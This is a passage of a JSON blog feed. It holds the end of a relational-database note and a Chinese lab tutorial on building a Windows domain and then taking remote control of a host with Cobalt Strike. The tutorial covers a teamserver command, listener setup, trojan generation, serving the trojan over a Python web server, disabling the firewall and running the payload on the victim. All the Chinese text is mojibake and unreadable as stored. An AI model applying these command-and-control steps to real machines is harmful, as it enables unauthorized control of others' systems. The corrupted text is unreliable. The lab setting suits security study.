å€¼</p>\n</li>\n</ol>\n<h3 id=\"234-ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§\"><a class=\"anchor\" href=\"#234-ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§\">#</a> 2.3.4 ç”¨æˆ·å®šä¹‰çš„å®Œæ•´æ€§</h3>\n<ul>\n<li>é’ˆå¯¹æŸä¸€å…·ä½“å…³ç³»æ•°æ®åº“çš„çº¦æŸæ¡ä»¶ï¼Œåæ˜ æŸä¸€å…·ä½“åº”ç”¨æ‰€æ¶‰åŠçš„æ•°æ®å¿…é¡»æ»¡è¶³çš„è¯­ä¹‰è¦æ±‚</li>\n<li>å…³ç³»æ¨¡å‹åº”æä¾›å®šä¹‰å’Œæ£€éªŒè¿™ç±»å®Œæ•´æ€§çš„æœºåˆ¶ï¼Œä»¥ä¾¿ç”¨ç»Ÿä¸€çš„ç³»ç»Ÿçš„æ–¹æ³•å¤„ç†å®ƒä»¬ï¼Œè€Œä¸è¦ç”±åº”ç”¨ç¨‹åºæ‰¿æ‹…è¿™ä¸€åŠŸèƒ½</li>\n</ul>\n<h2 id=\"24å…³ç³»ä»£æ•°\"><a class=\"anchor\" href=\"#24å…³ç³»ä»£æ•°\">#</a> 2.4 å…³ç³»ä»£æ•°</h2>\n<p>å…³ç³»ä»£æ•°</p>\n<ul>\n<li>ä¸€ç§æŠ½è±¡çš„æŸ¥è¯¢è¯­è¨€</li>\n<li>ç”¨å¯¹å…³ç³»çš„è¿ç®—æ¥è¡¨è¾¾æŸ¥è¯¢</li>\n</ul>\n<p>å…³ç³»ä»£æ•°çš„ä¸‰ä¸ªè¦ç´ </p>\n<ul>\n<li>è¿ç®—å¯¹è±¡ï¼šå…³ç³»</li>\n<li>è¿ç®—ç»“æœï¼šå…³ç³»</li>\n<li>è¿ç®—ç¬¦ï¼š4 ç±»</li>\n</ul>\n<p>é›†åˆè¿ç®—ç¬¦ï¼ˆï¼‰&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png</span>&quot; alt=&quot;image-20220923174757666&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<ul>\n<li>å°†å…³ç³»çœ‹æˆå…ƒç»„çš„é›†åˆ</li>\n<li>è¿ç®—æ˜¯ä»å…³ç³»çš„ â€œæ°´å¹³â€ æ–¹å‘å³è¡Œçš„è§’åº¦æ¥è¿›è¡Œ</li>\n</ul>\n<p>ä¸“é—¨çš„å…³ç³»è¿ç®—ç¬¦ &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png</span>&quot; alt=&quot;image-20220923175007786&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<ul>\n<li>ä¸ä»…æ¶‰åŠè¡Œè€Œä¸”æ¶‰åŠåˆ—</li>\n</ul>\n<p>å…³ç³»ä»£æ•°è¿ç®—çš„åˆ†ç±»</p>\n<ul>\n<li>\n<p>ä¼ ç»Ÿçš„é›†åˆè¿ç®—</p>\n<p>å¹¶ã€å·®ã€äº¤ã€å¹¿ä¹‰ç¬›å¡å°”ç§¯</p>\n</li>\n<li>\n<p>ä¸“é—¨çš„å…³ç³»è¿ç®—</p>\n<p>é€‰æ‹©ã€æŠ•å½±ã€è¿æ¥ã€é™¤</p>\n</li>\n</ul>\n",
            "tags": [
                "å…³ç³»æ•°æ®åº“",
                "æ•°æ®åº“"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "url": "https://blog.xcu.icu/2022/10/24/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E6%90%AD%E5%BB%BA/",
            "title": "åŸŸç¯å¢ƒåŸºç¡€å’Œæ­å»º",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>[TOC]</p>\n<h2 id=\"å†…ç½‘æ¸—é€çš„æµç¨‹æ¦‚è¿°\"><a class=\"anchor\" href=\"#å†…ç½‘æ¸—é€çš„æµç¨‹æ¦‚è¿°\">#</a> å†…ç½‘æ¸—é€çš„æµç¨‹æ¦‚è¿°</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907123946766.png\" alt=\"\" /></p>\n<p>å†…ç½‘æ¸—é€æ”»å‡»çš„æ˜¯ä¸€ä¸ªå†…ç½‘å†…çš„æ‰€æœ‰æœºå™¨</p>\n<p>ç›®çš„ï¼šæ§åˆ¶å†…ç½‘å†…çš„æ‰€æœ‰æœºå™¨</p>\n<p>å‰æï¼šå·²ç»æ§åˆ¶äº†å†…ç½‘é‡Œçš„ä¸€å°æœºå™¨</p>\n<h2 id=\"ä»€ä¹ˆæ˜¯å·¥ä½œåŸŸå’Œç»„\"><a class=\"anchor\" href=\"#ä»€ä¹ˆæ˜¯å·¥ä½œåŸŸå’Œç»„\">#</a> ä»€ä¹ˆæ˜¯å·¥ä½œåŸŸå’Œç»„</h2>\n<p>å·¥ä½œç»„ï¼šå·¥ä½œç»„æ˜¯å±€åŸŸç½‘ä¸­çš„ä¸€ä¸€ä¸ªæ¦‚å¿µã€‚å®ƒæ˜¯æœ€å¸¸è§æœ€ç®€å•æœ€æ™®é€šçš„èµ„æºç®¡ç†æ¨¡å¼ï¼Œå°±æ˜¯å°†<br />\nä¸åŒçš„ç”µè„‘æŒ‰åŠŸèƒ½åˆ†åˆ«åˆ—å…¥ä¸åŒçš„ç»„ä¸­ï¼Œä»¥æ–¹ä¾¿ç®¡ç†</p>\n<p>åŸŸ: Windows åŸŸæ˜¯è®¡ç®—æœºç½‘ç»œçš„ä¸€ç§å½¢å¼ï¼Œå…¶ä¸­æ‰€æœ‰ç”¨æˆ·å¸æˆ·ï¼Œè®¡ç®—æœºï¼Œæ‰“å°æœºå’Œå…¶ä»–å®‰å…¨<br />\nä¸»ä½“éƒ½åœ¨ä½äºç§°ä¸ºåŸŸæ§åˆ¶å™¨çš„ä¸€ - ä¸ªæˆ–å¤šä¸ªä¸­å¤®è®¡ç®—æœºé›†ç¾¤ä¸Šçš„ä¸­å¤®æ•°æ®åº“ä¸­æ³¨å†Œã€‚èº«ä»½éªŒè¯<br />\nåœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿›è¡Œã€‚åœ¨åŸŸä¸­ä½¿ç”¨è®¡ç®—æœºçš„æ¯ä¸ªäººéƒ½ä¼šæ”¶åˆ°ä¸€ä¸ªå”¯ä¸€çš„ç”¨æˆ·å¸æˆ·ï¼Œ ç„¶åå¯ä»¥ä¸º<br />\nè¯¥å¸æˆ·åˆ†é…å¯¹è¯¥åŸŸå†…èµ„æºçš„è®¿é—®æƒé™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907124937328.png\" alt=\"\" /></p>\n<p>å·¥ä½œç»„çš„ç¼ºç‚¹ï¼š</p>\n<ul>\n<li>ç¼ºä¹é›†ä¸­ç®¡ç†ä¸æ§åˆ¶çš„æœºåˆ¶</li>\n<li>æ²¡ç”¨é›†ä¸­çš„ç»Ÿä¸€è´¦æˆ·ç®¡ç†</li>\n<li>åªé€‚åˆå°è§„æ¨¡ç”¨æˆ·çš„ä½¿ç”¨</li>\n</ul>\n<p>æ§åˆ¶æ‰€æœ‰ä¸»æœºçš„åª’ä»‹å°±æ˜¯æ‰¾åˆ°åŸŸæ§</p>\n<h2 id=\"æ­å»ºåŸŸç¯å¢ƒ\"><a class=\"anchor\" href=\"#æ­å»ºåŸŸç¯å¢ƒ\">#</a> æ­å»ºåŸŸç¯å¢ƒ</h2>\n<p>å®éªŒç¯å¢ƒ</p>\n<ul>\n<li>åŸŸæ§ Windows server 2012</li>\n<li>åŸŸå†…ä¸»æœº Windows server 2008</li>\n<li>æ”»å‡»æœº kali</li>\n</ul>\n<p>å…ˆç™»å½•åŸŸæ§æœåŠ¡å™¨</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907130458478.png\" alt=\"\" /></p>\n<h3 id=\"1-è®¾ç½®æœåŠ¡å™¨\"><a class=\"anchor\" href=\"#1-è®¾ç½®æœåŠ¡å™¨\">#</a> 1ã€è®¾ç½®æœåŠ¡å™¨</h3>\n<p>åœ¨åŸŸæ§æœåŠ¡å™¨ä¸­é…ç½® ip åœ°å€ï¼ˆæ³¨æ„ï¼šè¿™é‡Œ DNS è¦ä¸ IP åœ°å€ç›¸åŒï¼Œé˜²æ­¢æ‰¾ä¸åˆ°åŸŸï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907131025908.png\" alt=\"\" /></p>\n<h3 id=\"2-æ›´æ”¹åŸŸæ§æœåŠ¡å™¨çš„ä¸»æœºå\"><a class=\"anchor\" href=\"#2-æ›´æ”¹åŸŸæ§æœåŠ¡å™¨çš„ä¸»æœºå\">#</a> 2ã€æ›´æ”¹åŸŸæ§æœåŠ¡å™¨çš„ä¸»æœºå</h3>\n<p>å°†åŸŸæ§ä¸»æœºåæ”¹ä¸º DCï¼ˆdo man controllerï¼‰</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907134746980.png\" alt=\"\" /></p>\n<p>æ”¹å®Œåä¹‹åç­‰å¾…åŸŸæ§æœåŠ¡å™¨é‡å¯</p>\n<h3 id=\"3-å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒdnsæœåŠ¡\"><a class=\"anchor\" href=\"#3-å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒdnsæœåŠ¡\">#</a> 3ã€å®‰è£…åŸŸæ§åˆ¶å™¨å’Œ DNS æœåŠ¡</h3>\n<p>æ¥ä¸‹æ¥åœ¨åŸŸæ§æœåŠ¡å™¨ä¸Šé¢å®‰è£…åŸŸæ§åˆ¶å™¨å’Œ DNS æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135517911.png\" alt=\"\" /></p>\n<p>å‰é¢çš„æ— è„‘ä¸‹ä¸€æ­¥å°±è¡Œ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135603793.png\" alt=\"\" /></p>\n<p>è¿™ä¸ªåœ°æ–¹å‹¾é€‰åŸºäºè§’è‰²åŠŸèƒ½çš„å®‰è£…ï¼Œæ— è„‘ä¸‹ä¸€æ­¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135758204.png\" alt=\"\" /></p>\n<p>è¿™ä¸ªåœ°æ–¹å®‰è£…åŸŸæ§åˆ¶å™¨å’Œ DNS æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907135857104.png\" alt=\"\" /></p>\n<p>ç­‰å¾…å®‰è£…å®Œæˆ</p>\n<p>åœ¨æœåŠ¡å™¨ç®¡ç†é¡µé¢ç‚¹å‡»é»„æ——</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140153956.png\" alt=\"\" /></p>\n<p>ç°åœ¨è¿˜æ²¡å‡çº§æˆä¸ºåŸŸæ§</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140250376.png\" alt=\"\" /></p>\n<p>å‡çº§</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140436007.png\" alt=\"\" /></p>\n<p>è¿™é‡Œé€‰æ‹©æ·»åŠ æ–°æ—ï¼Œå°±æ˜¯ç»™åŸŸæ§æœåŠ¡å™¨ä¸€ä¸ªåå­—</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140531418.png\" alt=\"\" /></p>\n<p>è¿™é‡Œçš„è·ŸåŸŸåè¦æ ¹æ®å¸¸è§åŸŸåæ ¼å¼ï¼Œæ¥ç€æ— è„‘ä¸‹ä¸€æ­¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140814473.png\" alt=\"\" /></p>\n<p>è¿™ä¸ªåœ°æ–¹çš„å¯†ç éšä¾¿è®¾ç½®å°±è¡Œï¼Œå½±å“ä¸å¤§ï¼Œç”¨ä¸ä¸Šï¼Œä¸€æ³¢æ— è„‘ä¸‹ä¸€æ­¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907140937411.png\" alt=\"\" /></p>\n<p>è¿™ä¸ªåœ°æ–¹ä¼šæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æ»¡è¶³å‡çº§ä¸ºåŸŸæ§çš„å…ˆå†³æ¡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907141053115.png\" alt=\"\" /></p>\n<p>æ£€æŸ¥é€šè¿‡åç‚¹å‡»å®‰è£…ï¼Œç»è¿‡é‡å¯ååŸŸæ§æœåŠ¡å™¨è°ƒè¯•å®Œæ¯•</p>\n<h3 id=\"4-åŸŸå†…ä¸»æœºåŠ å…¥åŸŸ\"><a class=\"anchor\" href=\"#4-åŸŸå†…ä¸»æœºåŠ å…¥åŸŸ\">#</a> 4ã€åŸŸå†…ä¸»æœºåŠ å…¥åŸŸ</h3>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142503472.png\" alt=\"\" /></p>\n<p>å…ˆæŸ¥çœ‹ 2008 çš„ ip çœ‹æ˜¯å¦èƒ½è”ç½‘</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142214395.png\" alt=\"\" /></p>\n<p>è¿™é‡Œè¦å°† DNS æœåŠ¡å™¨åœ°å€æ”¹ä¸ºåŸŸæ§æœåŠ¡å™¨çš„ ip åœ°å€</p>\n<p>æ¥ä¸‹æ¥æ”¹ä¸»æœºååŠ å…¥åŸŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907142736819.png\" alt=\"\" /></p>\n<p>åœ¨è·³å‡ºçš„å¼¹çª—ä¸­è¾“å…¥åŸŸæ§æœåŠ¡å™¨çš„ç”¨æˆ·åå’Œå¯†ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143008660.png\" alt=\"\" /></p>\n<p>å›è½¦åä¼šå¼¹å‡ºæˆåŠŸåŠ å…¥çš„å¼¹çª—</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907143217220.png\" alt=\"\" /></p>\n<p>æˆåŠŸå…¥ç‹±ï¼ˆç‹—å¤´ä¿å‘½ï¼‰</p>\n<h2 id=\"æ´»åŠ¨ç›®å½•adçš„ä½œç”¨\"><a class=\"anchor\" href=\"#æ´»åŠ¨ç›®å½•adçš„ä½œç”¨\">#</a> æ´»åŠ¨ç›®å½• AD çš„ä½œç”¨</h2>\n<p>å¯ä»¥ç†è§£ä¸ºåŸŸæ§ä¸Šé¢çš„æ•°æ®åº“ï¼Œåœ¨é‡Œé¢æ·»åŠ ç”¨æˆ·æ‰èƒ½ç™»å½•</p>\n<p>æ‰“å¼€åŸŸæ§æœåŠ¡å™¨æ‰¾åˆ° Action Directory ç”¨æˆ·å’Œè®¡ç®—æœº</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144119881.png\" alt=\"\" /></p>\n<p>è¿™é‡Œæ·»åŠ ä¸€ä¸ªç”¨æˆ·</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144450484.png\" alt=\"\" /></p>\n<p>è®¾ç½®å¯†ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144504724.png\" alt=\"\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907144539400.png\" alt=\"\" /></p>\n<p>ä½¿ç”¨ 2008 æˆåŠŸç™»å½•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907145139200.png\" alt=\"\" /></p>\n<h2 id=\"ä½¿ç”¨cobalt-strikeè¿œæ§ç”µè„‘\"><a class=\"anchor\" href=\"#ä½¿ç”¨cobalt-strikeè¿œæ§ç”µè„‘\">#</a> ä½¿ç”¨ Cobalt Strike è¿œæ§ç”µè„‘</h2>\n<p>æŠŠ cs æ–‡ä»¶å¯¼å…¥æ”»å‡»æœº</p>\n<p>è¿›å…¥ç›®å½•ä½¿ç”¨å‘½ä»¤ sudo bash teamserver ã€kali çš„ ipã€‘ å¯†ç </p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153453234.png\" alt=\"\" /></p>\n<p>å†å¼€ä¸€ä¸ªç«¯å£è¿è¡Œ bash cobaltsrike .sh</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153739520.png\" alt=\"\" /></p>\n<p>åœ¨å¼¹çª—ä¸­è¾“å…¥ kali çš„ ip</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907153947445.png\" alt=\"\" /></p>\n<p>æˆåŠŸè¿›å…¥ cs</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154002888.png\" alt=\"\" /></p>\n<p>å…ˆå¼€ä¸€ä¸ªç›‘å¬</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154214414.png\" alt=\"\" /></p>\n<p>ç‚¹å‡» add</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154343665.png\" alt=\"\" /></p>\n<p>è¾“å…¥å¯¹åº”çš„ ip å’Œç«¯å£</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154621003.png\" alt=\"\" /></p>\n<p>å¼€å§‹ç”Ÿæˆæœ¨é©¬</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154714949.png\" alt=\"\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907154830575.png\" alt=\"\" /></p>\n<p>ä½¿ç”¨ python3 èµ·ä¸€ä¸ª web ç¯å¢ƒ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907155034157.png\" alt=\"\" /></p>\n<p>è¿™é‡Œè¦å…³é—­é˜²ç«å¢™</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">å…ˆå®‰è£…\nsudo apt-get install ufw\n\næ£€æŸ¥é˜²ç«å¢™çš„çŠ¶æ€ï¼ˆé»˜è®¤ inactiveï¼‰ # ufw status\né˜²ç«å¢™ç‰ˆæœ¬ # ufw version\nå¯åŠ¨ufwé˜²ç«å¢™ # ufw enable\nå…³é—­ufwé˜²ç«å¢™ # ufw disable\né»˜è®¤ç¦æ­¢è®¿é—®æ‰€æœ‰ # ufw default deny\nå¼€æ”¾22/TCPç«¯å£ # ufw allow 22/tcp\nå¼€æ”¾53ç«¯å£(tcp/udp) # ufw allow 53\nç¦æ­¢å¤–éƒ¨è®¿é—® # ufw deny 3306\nåˆ é™¤å·²ç»æ·»åŠ è¿‡çš„è§„åˆ™ # ufw delete allow 22\nå…è®¸æ­¤IPè®¿é—®æ‰€æœ‰çš„æœ¬æœºç«¯å£ # ufw allow from 192.168.1.100\nåˆ é™¤ä¸Šé¢çš„è§„åˆ™ # ufw delete allow from 192.168.1.100\næŸ¥çœ‹è§„åˆ™ï¼Œæ˜¾ç¤ºè¡Œå· # ufw status numbered\nåˆ é™¤ç¬¬ä¸‰æ¡è§„åˆ™ # ufw delete 3\nå…³é—­ufw # ufw disable\nç¦æ­¢å¯¹8888ç«¯å£çš„è®¿é—® # ufw deny 8888\næ‰“å¼€æ¥è‡ª192.168.0.1çš„tcpè¯·æ±‚çš„22ç«¯å£ # ufw allow proto tcp from 192.168.0.1 to any port 22<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204556037.png\" alt=\"image-20220907204556037\" /></p>\n<p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åè¿è¡Œ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220907204632334.png\" alt=\"image-20220907204632334\" /></p>\n<p>æ”»å‡»æœºä¸ŠæˆåŠŸä¸Šçº¿</p>\n",
            "tags": [
                "å†…ç½‘",
                "åŸŸç¯å¢ƒ"
            ]
        }
    ]
}